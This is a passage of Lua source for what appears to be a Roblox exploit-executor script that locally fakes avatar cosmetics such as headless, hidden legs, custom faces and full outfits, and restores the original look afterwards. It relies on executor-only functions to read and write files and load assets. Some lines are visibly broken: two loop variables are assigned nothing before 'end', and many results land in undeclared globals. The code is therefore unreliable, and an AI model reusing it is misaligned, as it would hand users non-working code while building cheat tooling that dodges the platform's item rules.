state.headlessLoop)\nstate.headlessLoop = nil\nend\nif state.statsLoop then\npcall(task.cancel, state.statsLoop)\nstate.statsLoop = nil\nend\nend\nenforceHeadless = function(character, option)\nstopHeadless()\nif not option or not character or not (option.headless or option.hideLeftLeg or option.hideRightLeg) then return end\nif option.headless then hideOriginalHead(character) end\nif option.hideLeftLeg then hideLeftLeg(character) end\nif option.hideRightLeg then hideRightLeg(character) end\nstate.headlessConn = character.ChildAdded:Connect(function(child)\nif child:IsA("BasePart") and (option.hideLeftLeg or option.hideRightLeg) then\ntask.defer(function()\nif state.enabled and LP.Character==character then\nlocal active=OUTFITS[state.selected]\nif active.hideLeftLeg then hideLeftLeg(character) end\nif active.hideRightLeg then hideRightLeg(character) end end end) end\nif child.Name == "Head" and child:IsA("BasePart") and OUTFITS[state.selected].headless then\ntask.defer(function()\nif state.enabled and LP.Character == character and OUTFITS[state.selected].headless then\npcall(hideOriginalHead, character)\nend\nend)\nend\nend)\nstate.headlessLoop = \nend\nenforceStats = function(character)\nif state.statsLoop then\npcall(task.cancel, state.statsLoop)\nstate.statsLoop = nil\nend\nstate.statsLoop = \nend\nlocal function hideOriginalWearables(character, watchForNew)\nfor _, child in ipairs(character:GetChildren()) do\nif child:IsA("Shirt") or child:IsA("Pants") or child:IsA("ShirtGraphic") then\nif not child:GetAttribute("VX7LocalOnly") and state.hidden[child] == nil then\nlocal property = child:IsA("Shirt") and "ShirtTemplate"\nor child:IsA("Pants") and "PantsTemplate"\nor "Graphic"\nstate.hidden[child] = {property = property, value = child[property]}\nchild[property] = ""\nend\nend\nend\nfor _, child in ipairs(character:GetDescendants()) do\nif (child:IsA("Accessory") or child:IsA("Accoutrement")) and not child:GetAttribute("VX7LocalOnly") then\nlocal objects = child:GetDescendants()\nif child:IsA("BasePart") then table.insert(objects, child) end\nfor _, object in ipairs(objects) do\nif object:IsA("BasePart") then\nlocal saved = state.hidden[object]\nif saved == nil then\nstate.hidden[object] = {\nbasePart = true,\nlocalTransparency = object.LocalTransparencyModifier,\ntransparency = object.Transparency,\n}\nelseif type(saved) ~= "table" then\nstate.hidden[object] = {\nbasePart = true,\nlocalTransparency = saved,\ntransparency = object.Transparency,\n}\nend\nobject.LocalTransparencyModifier = 1\nobject.Transparency = 1\nelseif (object:IsA("Decal") or object:IsA("Texture")) and state.hidden[object] == nil then\nstate.hidden[object] = object.Transparency\nobject.Transparency = 1\nelseif (object:IsA("ParticleEmitter") or object:IsA("Trail") or object:IsA("Beam")) and state.hidden[object] == nil then\nstate.hidden[object] = {property = "Enabled", value = object.Enabled}\nobject.Enabled = false\nend\nend\nend\nend\nif watchForNew and not state.wearableConn then\nstate.wearableConn = character.DescendantAdded:Connect(function(object)\nif not state.enabled or not OUTFITS[state.selected].clearOriginalWearables then return end\nif object:IsA("Accessory") or object:IsA("Accoutrement")\nor object:FindFirstAncestorWhichIsA("Accessory")\nor object:FindFirstAncestorWhichIsA("Accoutrement") then\ntask.defer(function()\nif state.enabled and character.Parent then hideOriginalWearables(character, false) end\nend)\nend\nend)\nend\nend\nlocal function loadAssetObjects(assetId)\ndo local __m = {pcall(function() return InsertService:LoadAsset(assetId) end)}; insertOk = __m[1]; inserted = __m[2]; end\nif insertOk and inserted then return {inserted}, "InsertService" end\ndo local __m = {pcall(function() return game:GetObjects("rbxassetid://" .. assetId) end)}; objectOk = __m[1]; objects = __m[2]; end\nif objectOk and objects and #objects > 0 then return objects, "GetObjects" end\nreturn nil, tostring(inserted or objects or "unknown loading error")\nend\nlocal faceTextureCache = {}\nlocal function resolveFaceTexture(faceId)\nif faceTextureCache[faceId] then return faceTextureCache[faceId] end\nlocal objects = loadAssetObjects(faceId)\nif objects then\nlocal texture\nfor _, root in ipairs(objects) do\nlocal candidates = {root}\nfor _, object in ipairs(root:GetDescendants()) do table.insert(candidates, object) end\nfor _, object in ipairs(candidates) do\nif object:IsA("Decal") or object:IsA("Texture") then\ntexture = object.Texture\nif texture and texture ~= "" then break end\nend\nend\npcall(function() root:Destroy() end)\nif texture and texture ~= "" then break end\nend\nif texture and texture ~= "" then\nfaceTextureCache[faceId] = texture\nreturn texture\nend\nend\nreturn "rbxassetid://" .. tostring(faceId)\nend\nlocal function applyLocalFace(character, faceId)\nlocal head = character:FindFirstChild("Head")\nif not head then return false end\nlocal face = head:FindFirstChild("face") or head:FindFirstChildWhichIsA("Decal")\nif face and not face:IsA("Decal") then face = nil end\nif face then\nif state.hidden[face] == nil then\nstate.hidden[face] = {\nproperties = {Texture = face.Texture, Transparency = face.Transparency},\n}\nend\nelse\nface = Instance.new("Decal")\nface.Name = "face"\nface.Face = Enum.NormalId.Front\nface:SetAttribute("VX7LocalOnly", true)\nface.Parent = head\ntable.insert(state.visuals, face)\nend\nface.Texture = resolveFaceTexture(faceId)\nface.Transparency = 0\nreturn true\nend\nlocal function applyLocalFaceStable(character, faceId)\npcall(applyLocalFace, character, faceId)\nfor _, delayTime in ipairs({0.2, 0.8}) do\ntask.delay(delayTime, function()\nlocal option = OUTFITS[state.selected]\nif state.enabled and LP.Character == character and option and option.face == faceId then\npcall(applyLocalFace, character, faceId)\nend\nend)\nend\nend\nlocal function findCharacterAttachment(character, name)\nfor _, object in ipairs(character:GetDescendants()) do\nif object:IsA("Attachment") and object.Name == name and not object:FindFirstAncestorWhichIsA("Accessory") then\nreturn object\nend\nend\nend\nlocal function sanitizeVisual(container)\nlocal objects = container:GetDescendants()\nif container:IsA("BasePart") then table.insert(objects, container) end\nfor _, object in ipairs(objects) do\nif object:IsA("LuaSourceContainer") then\nobject:Destroy()\nelseif object:IsA("BasePart") then\nobject.Anchored = false\nobject.CanCollide = false\nobject.CanTouch = false\nobject.CanQuery = false\nobject.Massless = true\nobject.CastShadow = false\nelseif object:IsA("JointInstance") and object.Name == "AccessoryWeld" then\nobject:Destroy()\nend\nend\nend\nlocal function weldPart(part, target)\nlocal weld = Instance.new("WeldConstraint")\nweld.Name = "VX7LocalVisualWeld"\nweld.Part0 = target\nweld.Part1 = part\nweld.Parent = part\nend\nlocal function countStackedAccessories(character, attachmentName)\nlocal count = 0\nfor _, visual in ipairs(state.visuals) do\nif visual:IsA("Accessory") then\nlocal h = visual:FindFirstChild("Handle") or visual:FindFirstChildWhichIsA("BasePart", true)\nif h then\nfor _, child in ipairs(h:GetChildren()) do\nif child:IsA("Attachment") and child.Name == attachmentName then\ncount = count + 1\nbreak\nend\nend\nend\nend\nend\nreturn count\nend\nlocal function attachAccessoryLocal(accessory, character, rootPart, assetId)\nlocal handle = accessory:FindFirstChild("Handle") or accessory:FindFirstChildWhichIsA("BasePart", true)\nif not handle then return false end\nsanitizeVisual(accessory)\naccessory.Name = "VX7_LocalOutfit_" .. tostring(assetId)\naccessory:SetAttribute("VX7AssetId", assetId)\naccessory:SetAttribute("VX7LocalOnly", true)\nlocal option=OUTFITS[state.selected]\nlocal slot=option and option.accessorySlots and option.accessorySlots[assetId]\nif slot then pcall(function() accessory.AccessoryType=slot end) end\naccessory.Parent = character\nlocal sourceAttachment\nfor _, child in ipairs(handle:GetChildren()) do\nif child:IsA("Attachment") and findCharacterAttachment(character, child.Name) then\nsourceAttachment = child\nbreak\nend\nend\nlocal targetAttachment = sourceAttachment and findCharacterAttachment(character, sourceAttachment.Name)\nlocal targetPart = targetAttachment and targetAttachment.Parent\nif targetAttachment and targetPart and targetPart:IsA("BasePart") then\nhandle.CFrame = targetAttachment.WorldCFrame * sourceAttachment.CFrame:Inverse()\nlocal stacked = countStackedAccessories(character, sourceAttachment.Name)\nif stacked > 0 then\nhandle.CFrame = handle.CFrame * CFrame.new(0, stacked * 0.15, 0)\nend\nelse\ntargetPart = character:FindFirstChild("LowerTorso")\nor character:FindFirstChild("Torso")\nor rootPart\nif not targetPart then accessory:Destroy(); return false end\nhandle.CFrame = rootPart.CFrame\nend\nweldPart(handle, targetPart)\ntable.insert(state.visuals, accessory)\nreturn true\nend\nlocal function attachLooseVisual(rootObject, character, rootPart, assetId, textureId, targetPart)\nlocal clone = rootObject:Clone()\nsanitizeVisual(clone)\nclone.Name = "VX7_LocalOutfit_" .. tostring(assetId)\nclone:SetAttribute("VX7AssetId", assetId)\nclone.Parent = character\nlocal parts = {}\nif clone:IsA("BasePart") then table.insert(parts, clone) end\nfor _, object in ipairs(clone:GetDescendants()) do\nif object:IsA("BasePart") then table.insert(parts, object) end\nend\nif #parts == 0 then clone:Destroy(); return false end\nlocal anchor = targetPart or rootPart\nif textureId then\nfor _, part in ipairs(parts) do\nif part:IsA("MeshPart") then\npcall(function() part.TextureID = "rbxassetid://" .. tostring(textureId) end)\nend\nend\nend\nlocal pivot = clone:IsA("Model") and clone:GetPivot() or parts[1].CFrame\nfor _, part in ipairs(parts) do\nlocal offset = pivot:ToObjectSpace(part.CFrame)\npart.CFrame = anchor.CFrame * offset\nweldPart(part, anchor)\nend\ntable.insert(state.visuals, clone)\nreturn true\nend\nlocal function attachClassicClothingLocal(rootObject, character, assetId)\nlocal candidates = {}\nif rootObject:IsA("Shirt") or rootObject:IsA("Pants") or rootObject:IsA("ShirtGraphic") then\ntable.insert(candidates, rootObject)\nend\nfor _, object in ipairs(rootObject:GetDescendants()) do\nif object:IsA("Shirt") or object:IsA("Pants") or object:IsA("ShirtGraphic") then\ntable.insert(candidates, object)\nend\nend\nlocal added = 0\nfor _, source in ipairs(candidates) do\nfor _, existing in ipairs(character:GetChildren()) do\nif existing.ClassName == source.ClassName and not existing:GetAttribute("VX7LocalOnly") then\nlocal property = existing:IsA("Shirt") and "ShirtTemplate"\nor existing:IsA("Pants") and "PantsTemplate"\nor "Graphic"\nstate.hidden[existing] = {property = property, value = existing[property]}\nexisting[property] = ""\nend\nend\nlocal clone = source:Clone()\nclone.Name = "VX7_LocalClothing_" .. tostring(assetId)\nclone:SetAttribute("VX7AssetId", assetId)\nclone:SetAttribute("VX7LocalOnly", true)\nclone.Parent = character\ntable.insert(state.visuals, clone)\nadded = added + 1\nend\nreturn added\nend\nlocal function attachBodyPartsLocal(rootObject, character, assetId, textureId)\nlocal holder = Instance.new("Model")\nholder.Name = "VX7_LocalBody_" .. tostring(assetId)\nholder:SetAttribute("VX7AssetId", assetId)\nholder:SetAttribute("VX7LocalOnly", true)\nholder.Parent = character\nlocal bodyColors = rootObject:FindFirstChildOfClass("BodyColors")\nlocal colorProperties = {\nHead = "HeadColor", UpperTorso = "TorsoColor", LowerTorso = "TorsoColor", Torso = "TorsoColor",\nLeftUpperArm = "LeftArmColor", LeftLowerArm = "LeftArmColor", LeftHand = "LeftArmColor", ["Left Arm"] = "LeftArmColor",\nRightUpperArm = "RightArmColor", RightLowerArm = "RightArmColor", RightHand = "RightArmColor", ["Right Arm"] = "RightArmColor",\nLeftUpperLeg = "LeftLegColor", LeftLowerLeg = "LeftLegColor", LeftFoot = "LeftLegColor", ["Left Leg"] = "LeftLegColor",\nRightUpperLeg = "RightLegColor", RightLowerLeg = "RightLegColor", RightFoot = "RightLegColor", ["Right Leg"] = "RightLegColor",\n}\nlocal added = 0\nlocal candidates = {}\nif rootObject:IsA("BasePart") then table.insert(candidates, rootObject) end\nfor _, object in ipairs(rootObject:GetDescendants()) do\nif object:IsA("BasePart") and not object:FindFirstAncestorWhichIsA("Accessory") then\ntable.insert(candidates, object)\nend\nend\nfor _, source in ipairs(candidates) do\nlocal partName = source.Name\nif BODY_PART_NAMES[partName] then\nlocal target = character:FindFirstChild(partName)\nif not target then\nlocal alias = PART_NAME_ALIASES[partName]\nif alias then target = character:FindFirstChild(alias) end\nend\nif target and target:IsA("BasePart") then\nlocal clone = source:Clone()\nfor _, child in ipairs(clone:GetDescendants()) do\nif child:IsA("JointInstance") or child:IsA("Constraint") or child:IsA("LuaSourceContainer") then\nchild:Destroy()\nend\nend\nsanitizeVisual(clone)\nclone.Name = source.Name\nif clone:IsA("MeshPart") and textureId then\npcall(function() clone.TextureID = "rbxassetid://" .. tostring(textureId) end)\nend\nif bodyColors and colorProperties[source.Name] then\npcall(function() clone.Color = bodyColors[colorProperties[source.Name]].Color end)\nend\nclone.CFrame = target.CFrame\nclone.Parent = holder\nweldPart(clone, target)\nadded = added + 1\nend\nend\nend\nif added == 0 then holder:Destroy(); return 0 end\ntable.insert(state.visuals, holder)\nreturn added\nend\nlocal assetInfoCache = {}\nlocal ASSET_INFO_CACHE_FILE="vx7/Vx7SkinPreviewAssets.json"\npcall(function()\nif isfile and readfile and isfile(ASSET_INFO_CACHE_FILE) then\nlocal decoded=HttpService:JSONDecode(readfile(ASSET_INFO_CACHE_FILE))\nif type(decoded)=="table" then for id,assetType in pairs(decoded) do\nlocal numericId=tonumber(id);local numericType=tonumber(assetType)\nif numericId and numericType then assetInfoCache[numericId]=numericType end end end end end)\nlocal assetInfoSaveQueued=false\nlocal function saveAssetInfoCache()\nif assetInfoSaveQueued or not writefile then return end\nassetInfoSaveQueued=true;task.delay(.4,function()\nassetInfoSaveQueued=false;pcall(function()\nlocal encoded={};for id,assetType in pairs(assetInfoCache) do encoded[tostring(id)]=assetType end\nwritefile(ASSET_INFO_CACHE_FILE,HttpService:JSONEncode(encoded)) end) end) end\nlocal bodyPropertyByType = {\n[17] = "Head", [27] = "Torso", [28] = "RightArm",\n[29] = "LeftArm", [30] = "LeftLeg", [31] = "RightLeg", [79] = "Head",\n}\nlocal bodyPartAnchorNames = {\n[17] = {"Head"}, [79] = {"Head"},\n[27] = {"UpperTorso", "Torso"},\n[28] = {"RightUpperArm", "Right Arm"},\n[29] = {"LeftUpperArm", "Left Arm"},\n[30] = {"LeftUpperLeg", "Left Leg"},\n[31] = {"RightUpperLeg", "Right Leg"},\n}\nlocal accessoryTypeByAssetType = {\n[8] = Enum.AccessoryType.Hat,\n[41] = Enum.AccessoryType.Hair,\n[42] = Enum.AccessoryType.Face,\n[43] = Enum.AccessoryType.Neck,\n[44] = Enum.AccessoryType.Shoulder,\n[45] = Enum.AccessoryType.Front,\n[46] = Enum.AccessoryType.Back,\n[47] = Enum.AccessoryType.Waist,\n[64] = Enum.AccessoryType.TShirt,\n[65] = Enum.AccessoryType.Shirt,\n[66] = Enum.AccessoryType.Pants,\n[67] = Enum.AccessoryType.Jacket,\n[68] = Enum.AccessoryType.Sweater,\n[69] = Enum.AccessoryType.Shorts,\n[70] = Enum.AccessoryType.LeftShoe,\n[71] = Enum.AccessoryType.RightShoe,\n[72] = Enum.AccessoryType.DressSkirt,\n[76] = Enum.AccessoryType.Eyebrow,\n[77] = Enum.AccessoryType.Eyelash,\n}\nlocal function getAssetTypeId(assetId)\nif assetInfoCache[assetId] then return assetInfoCache[assetId] end\ndo local __m = {pcall(MarketplaceService.GetProductInfo, MarketplaceService, assetId, Enum.InfoType.Asset)}; ok = __m[1]; info = __m[2]; end\nif ok and info and info.AssetTypeId then\nassetInfoCache[assetId] = info.AssetTypeId\nsaveAssetInfoCache()\nreturn info.AssetTypeId\nend\nend\nlocal accessoryDescriptionProperties = {\n"BackAccessory", "FaceAccessory", "FrontAccessory", "HairAccessory",\n"HatAccessory", "NeckAccessory", "ShouldersAccessory", "WaistAccessory",\n"TShirtAccessory", "ShirtAccessory", "PantsAccessory", "JacketAccessory",\n"SweaterAccessory", "ShortsAccessory", "DressSkirtAccessory",\n"EyebrowAccessory", "EyelashAccessory",\n}\nlocal function createDirectDescription(option, humanoid)\nlocal directOutfitId = option.outfitId\nlocal completeOutfitDescription\nif directOutfitId then\ndo local __m = {pcall(\nPlayers.GetHumanoidDescriptionFromOutfitId,\nPlayers,\ndirectOutfitId\n)}; ok = __m[1]; outfitDescription = __m[2]; end\nif not ok or not outfitDescription then return nil end\ncompleteOutfitDescription = outfitDescription\nif not option.items and not option.face and not option.head then return outfitDescription end\nend\nlocal source = completeOutfitDescription or state.originalDescription\nif not source then\ndo local __m = {pcall(function() return humanoid:GetAppliedDescription() end)}; ok = __m[1]; applied = __m[2]; end\nif not ok or not applied then return nil end\nsource = applied\nend\nlocal description = source:Clone()\nif completeOutfitDescription then completeOutfitDescription:Destroy() end\nif not directOutfitId then\ndescription.Shirt = 0\ndescription.Pants = 0\ndescription.GraphicTShirt = 0\nfor _, property in ipairs(accessoryDescriptionProperties) do\npcall(function() description[property] = "" end)\nend\npcall(function() description:SetAccessories({}, true) end)\nend\nlocal accessories = {}\nif directOutfitId then\npcall(function() accessories = description:GetAccessories(true) end)\nend\nlocal allItems = {}\nfor _, id in ipairs(option.bodyItems or {}) do table.insert(allItems, id) end\nfor _, id in ipairs(option.items or {}) do table.insert(allItems, id) end\nfor _, id in ipairs(allItems) do\nlocal assetTypeId = getAssetTypeId(id)\nif not assetTypeId then description:Destroy(); return nil end\nlocal bodyProperty = bodyPropertyByType[assetTypeId]\nlocal accessoryType = accessoryTypeByAssetType[assetTypeId]\nif bodyProperty then\ndescription[bodyProperty] = id\nelseif assetTypeId == 11 then\ndescription.Shirt = id\nelseif assetTypeId == 12 then\ndescription.Pants = id\nelseif assetTypeId == 1 then\ndescription.GraphicTShirt = id\nelseif assetTypeId == 18 then\ndescription.Face = id\nelseif accessoryType then\nlocal accessory = {\nAssetId = id,\nAccessoryType = accessoryType,\nOrder = #accessories + 1,\n}\nif assetTypeId >= 64 and assetTypeId <= 72 then\naccessory.IsLayered = true\naccessory.Puffiness = option.layeredPuffiness or 0\nend\ntable.insert(accessories, accessory)\nelse\ndescription:Destroy()\nreturn nil\nend\nend\nif option.face then\nlocal faceTypeId = getAssetTypeId(option.face)\nlocal faceBodyProperty = faceTypeId and bodyPropertyByType[faceTypeId]\nlocal faceAccessoryType = faceTypeId and accessoryTypeByAssetType[faceTypeId]\nif option.faceMode == "decal" then\nif faceTypeId == 18 then description.Face = option.face end\nelseif faceBodyProperty then\ndescription[faceBodyProperty] = option.face\nelseif faceAccessoryType then\ntable.insert(accessories, {\nAssetId = option.face,\nAccessoryType = faceAccessoryType,\nOrder = #accessories + 1,\n})\nelseif faceTypeId == 18 then\ndescription.Face = option.face\nend\nend\nif option.head then description.Head = option.head end\nfor property, value in pairs(option.scales or {}) do\npcall(function() description[property] = value end)\nend\nif option.skinColor then\nfor _, property in ipairs({"HeadColor", "LeftArmColor", "RightArmColor", "LeftLegColor", "RightLegColor", "TorsoColor"}) do\ndescription[property] = option.skinColor\nend\nend\nif #accessories > 0 then\nlocal ok = pcall(function() description:SetAccessories(accessories, true) end)\nif not ok then description:Destroy(); return nil end\nend\nreturn description\nend\nlocal statusText\nlocal function setStatus(text, good)\nif not statusText or not statusText.Parent then return end\nstatusText.Text = text\nstatusText.TextColor3 = good and Color3.fromRGB(215, 255, 222) or Color3.fromRGB(190, 190, 198)\nend\nlocal function applyOutfit()\nlocal character, humanoid, rootPart = currentCharacter()\nif not character or not humanoid or not rootPart then setStatus("Character not found", false); return false end\nif state.descriptionCharacter ~= character or not state.originalDescription then\nstate.descriptionCharacter = character\nstate.originalDescription = nil\ndo local __m = {pcall(function() return humanoid:GetAppliedDescription() end)}; ok = __m[1]; applied = __m[2]; end\nif ok and applied then state.originalDescription = applied:Clone() end\nend\nclearVisuals()\nsetStatus("Loading local visual...", false)\nlocal option = OUTFITS[state.selected]\nlocal assetId = option.id or option.outfitId\nstate.skipDescriptionRestore=option.preserveRig==true\nif option.forceBodyParts or option.localOnly then\nsetStatus("Local visual only (no rig change)...", false)\nend\nif (option.bodyItems or option.items or option.outfitId) and not option.forceBodyParts and not option.localOnly then\nsetStatus(option.outfitId and "Loading complete outfit..." or "Applying outfit and complexion...", false)\nlocal description = createDirectDescription(option, humanoid)\nif description then\nlocal savedHead = character:FindFirstChild("Head")\nlocal savedHealth = humanoid.Health\nstate.savedWalkSpeed = humanoid.WalkSpeed\nstate.savedJumpPower = humanoid.JumpPower\nlocal savedCFrame = rootPart.CFrame\nlocal savedVelocity = rootPart.AssemblyLinearVelocity\nlocal ok = pcall(function() humanoid:ApplyDescription(description) end)\nif not ok then ok = pcall(function() humanoid:ApplyDescriptionReset(description) end) end\ndescription:Destroy()\nif ok then\nlocal currentHumanoid = character:FindFirstChildOfClass("Humanoid")\nlocal currentRoot = character:FindFirstChild("HumanoidRootPart")\nif currentHumanoid and savedHealth > 0 then\ncurrentHumanoid.Health = math.min(savedHealth, currentHumanoid.MaxHealth)\nend\nif currentRoot then\ncurrentRoot.CFrame = savedCFrame\ncurrentRoot.AssemblyLinearVelocity = savedVelocity\ncurrentRoot.AssemblyAngularVelocity = Vector3.zero\nend\nif option.face then\nlocal faceTypeId = getAssetTypeId(option.face)\nif option.faceMode == "decal" or not faceTypeId or faceTypeId == 18 then\napplyLocalFaceStable(character, option.face)\nend\nend\nstate.enabled = true\nenforceStats(character)\nenforceHeadless(character, option)\nif option.hideLeftLeg then hideLeftLeg(character) end\nif option.hideRightLeg then hideRightLeg(character) end\nif option.head and character:FindFirstChild("Head") == savedHead then\nhideOriginalHead(character)\nend\nsetStatus(option.label .. " applied - native avatar method", true)\nreturn true\nend\nend\nsetStatus("Native apply failed; using visual fallback...", false)\nend\nlocal assetIds = {}\nfor _, id in ipairs(option.items or {}) do table.insert(assetIds, id) end\nif option.head then table.insert(assetIds, option.head) end\nif #assetIds == 0 and assetId and not option.outfitId then table.insert(assetIds, assetId) end\nlocal fallbackFaceType = option.face and getAssetTypeId(option.face)\nlocal faceIsAccessory = option.faceMode ~= "decal"\nand fallbackFaceType\nand accessoryTypeByAssetType[fallbackFaceType] ~= nil\nif faceIsAccessory then table.insert(assetIds, option.face) end\nlocal attached, expected = 0, 0\nlocal lastError\nexpected = expected + (option.face and not faceIsAccessory and 1 or 0)\nfor _, currentAssetId in ipairs(assetIds) do\nlocal objects, method = loadAssetObjects(currentAssetId)\nif objects then\nfor _, loadedRoot in ipairs(objects) do\nlocal rootAttached = false\nlocal bodyPartsAttached = false\nlocal classics = {}\nif loadedRoot:IsA("Shirt") or loadedRoot:IsA("Pants") or loadedRoot:IsA("ShirtGraphic") then\ntable.insert(classics, loadedRoot)\nend\nfor _, object in ipairs(loadedRoot:GetDescendants()) do\nif object:IsA("Shirt") or object:IsA("Pants") or object:IsA("ShirtGraphic") then\ntable.insert(classics, object)\nend\nend\nlocal accessories = {}\nif loadedRoot:IsA("Accessory") then\ntable.insert(accessories, loadedRoot)\nelse\nfor _, object in ipairs(loadedRoot:GetDescendants()) do\nif object:IsA("Accessory") then table.insert(accessories, object:Clone()) end\nend\nend\nlocal assetTypeId = getAssetTypeId(currentAssetId)\nlocal isBodyPartAsset = assetTypeId ~= nil and bodyPropertyByType[assetTypeId] ~= nil\nlocal bodyCandidates = 0\nlocal wantsBodyParts = not loadedRoot:IsA("Accessory")\nand (option.hideOriginal or option.hideOriginalHead or currentAssetId == option.head or (option.forceBodyParts and isBodyPartAsset))\nif wantsBodyParts then\nlocal candidates = {}\nif loadedRoot:IsA("BasePart") then table.insert(candidates, loadedRoot) end\nfor _, object in ipairs(loadedRoot:GetDescendants()) do\nif object:IsA("BasePart") and not object:FindFirstAncestorWhichIsA("Accessory") then\ntable.insert(candidates, object)\nend\nend\nfor _, object in ipairs(candidates) do\nif BODY_PART_NAMES[object.Name] or PART_NAME_ALIASES[object.Name] then bodyCandidates = bodyCandidates + 1 end\nend\nend\nexpected = expected + #classics + #accessories + bodyCandidates\nif #accessories == 0 and #classics == 0 and bodyCandidates == 0 then expected = expected + 1 end\nif #classics > 0 then\ndo local __m = {pcall(attachClassicClothingLocal, loadedRoot, character, currentAssetId)}; ok = __m[1]; result = __m[2]; end\nif ok and result and result > 0 then attached = attached + result; rootAttached = true end\nend\nif wantsBodyParts and bodyCandidates > 0 then\ndo local __m = {pcall(attachBodyPartsLocal, loadedRoot, character, currentAssetId, option.headTexture)}; ok = __m[1]; result = __m[2]; end\nif ok and result and result > 0 then\nattached = attached + result\nrootAttached = true\nbodyPartsAttached = true\nend\nend\nfor _, accessory in ipairs(accessories) do\ndo local __m = {pcall(attachAccessoryLocal, accessory, character, rootPart, currentAssetId)}; ok = __m[1]; result = __m[2]; end\nif ok and result then\nattached = attached + 1\nrootAttached = true\nelse\npcall(function() accessory:Destroy() end)\nend\nend\nif not rootAttached and not bodyPartsAttached and #accessories == 0 and #classics == 0 then\nlocal headAnchor = character:FindFirstChild("Head")\nlocal anchor = rootPart\nif currentAssetId == option.head then\nanchor = headAnchor\nelseif isBodyPartAsset then\nlocal anchorNames = bodyPartAnchorNames[assetTypeId]\nif anchorNames then\nfor _, name in ipairs(anchorNames) do\nlocal target = character:FindFirstChild(name)\nif target and target:IsA("BasePart") then anchor = target; break end\nend\nend\nend\ndo local __m = {pcall(attachLooseVisual, loadedRoot, character, rootPart, currentAssetId, option.headTexture, anchor)}; ok = __m[1]; result = __m[2]; end\nif ok and result then attached = attached + 1 end\nend\nif loadedRoot.Parent == nil and not table.find(state.visuals, loadedRoot) then\npcall(function() loadedRoot:Destroy() end)\nend\nend\nelse\nlastError = method\nend\nend\nlocal faceApplied = false\nif option.face and not faceIsAccessory then\ndo local __m = {pcall(applyLocalFace, character, option.face)}; ok = __m[1]; result = __m[2]; end\nfaceApplied = ok and result == true\nend\nlocal headlessApplied = false\nif option.headless then\nenforceHeadless(character, option)\nheadlessApplied = true\nend\nlocal legApplied = false\nif option.hideLeftLeg then\nhideLeftLeg(character)\nlegApplied = true\nend\nif option.hideRightLeg then\nhideRightLeg(character)\nlegApplied = true\nend\nlocal totalItems = expected\nlocal loadedItems = attached + (faceApplied and 1 or 0)\nstate.enabled = attached > 0 or faceApplied or headlessApplied or legApplied\nif state.enabled then\nif option.preserveRig and (option.hideLeftLeg or option.hideRightLeg) then enforceHeadless(character,option) end\nif option.hideOriginal then hideOriginalBody(character) end\nif option.hideOriginalHead then hideOriginalHead(character) end\nif option.head then hideOriginalHead(character) end\nif option.clearOriginalWearables then hideOriginalWearables(character, true) end\nsetStatus(string.format("%s fallback - %d/%d items", option.label, loadedItems, totalItems), loadedItems == totalItems)\nelse\nsetStatus("Could not attach outfit - " .. tostring(lastError or "no 3D parts"), false)\nend\nreturn state.enabled\nend\nlocal function restoreOriginalDescription()\nlocal description = state.originalDescription\nlocal character = LP.Character\nlocal humanoid = character and character:FindFirstChildOfClass("Humanoid")\nif description and humanoid and character == state.descriptionCharacter and not state.skipDescriptionRestore then\nlocal clone = description:Clone()\nlocal ok = pcall(function() humanoid:ApplyDescription(clone) end)\nif not ok then pcall(function() humanoid:ApplyDescriptionReset(clone) end) end\nclone:Destroy()\nend\nif state.originalDescription then state.originalDescription:Destroy() end\nstate.originalDescription = nil\nstate.descriptionCharacter = nil\nstate.skipDescriptionRestore=false\nend\nlocal function removeOutfit()\nstate.enabled = false\nclearVisuals()\nrestoreOriginalDescription()\nsetStatus("Local visual removed", true)\nend\nreturn {\noutfits = OUTFITS,\napply = function(index)\nstate.selected = math.clamp(math.floor(tonumber(index) or 1), 1, #OUTFITS)\nreturn applyOutfit()\nend,\nremove = removeOutfit,\ndescription = function(index)\nlocal character = LP.Character\nlocal humanoid = character and character:FindFirstChildOfClass("Humanoid")\nlocal option = OUTFITS[math.clamp(math.floor(tonumber(index) or 1), 1, #OUTFITS)]\nif not humanoid or not option then return nil end\nlocal strict = createDirectDescription(option, humanoid)\nif strict then return strict end\ndo local __m = {pcall(function() return humanoid:GetAppliedDescription() end)}; ok = __m[1]; applied = __m[2]; end\nif not ok or not applied then return nil end\nlocal description = applied:Clone(); applied:Destroy()\ndescription.Shirt=0; description.Pants=0; description.GraphicTShirt=0\nfor _,property in ipairs(accessoryDescriptionProperties) do pcall(function() description[property]="" end) end\npcall(function() description:SetAccessories({},true) end)\nlocal accessories={}; local all={}\nfor _,id in ipairs(option.bodyItems or {}) do table.insert(all,id) end\nfor _,id in ipairs(option.items or {}) do table.insert(all,id) end\nfor _,id in ipairs(all) do\nlocal assetTypeId=getAssetTypeId(id); local bodyProperty=assetTypeId and bodyPropertyByType[assetTypeId]; local accessoryType=assetTypeId and accessoryTypeByAssetType[assetTypeId]\nif bodyProperty then description[bodyProperty]=id elseif assetTypeId==11 then description.Shirt=id elseif assetTypeId==12 then description.Pants=id elseif assetTypeId==1 then description.GraphicTShirt=id elseif assetTypeId==18 then description.Face=id elseif accessoryType then\ntable.insert(accessories,{AssetId=id,AccessoryType=accessoryType,Order=#accessories+1,IsLayered=assetTypeId>=64 and assetTypeId<=72,Puffiness=option.layeredPuffiness or 0}) end\nend\nif option.face then local faceType=getAssetTypeId(option.face); if faceType==18 then description.Face=option.face elseif faceType and bodyPropertyByType[faceType] then description[bodyPropertyByType[faceType]]=option.face elseif faceType and accessoryTypeByAssetType[faceType] then table.insert(accessories,{AssetId=option.face,AccessoryType=accessoryTypeByAssetType[faceType],Order=#accessories+1}) end end\nif option.head then description.Head=option.head end\nfor property,value in pairs(option.scales or {}) do pcall(function() description[property]=value end) end\nif #accessories>0 then pcall(function() description:SetAccessories(accessories,true) end) end\nreturn description\nend,\npreviewModel = function(index)\nlocal option=OUTFITS[math.clamp(math.floor(tonumber(index) or 1),1,#OUTFITS)]; local character=LP.Character\nif not option or not character then return nil end\nlocal oldArchivable=character.Archivable; character.Archivable=true; local ok, clone; do local __m = {pcall(function() return character:Clone() end)}; ok = __m[1]; clone = __m[2]; end; character.Archivable=oldArchivable\nif not ok or not clone then return nil end\nfor _,child in ipairs(clone:GetChildren()) do\nif child:IsA("Accessory") or child:IsA("Accoutrement") or child:IsA("Shirt") or child:IsA("Pants") or child:IsA("ShirtGraphic") or child:IsA("CharacterMesh") or child:IsA("Tool") then child:Destroy() end\nend\nfor _,object in ipairs(clone:GetDescendants()) do if object:IsA("LuaSourceContainer") then object:Destroy() elseif object:IsA("BasePart") then object.Transparency=object.Name=="HumanoidRootPart" and 1 or 0; object.LocalTransparencyModifier=0 end end\nlocal 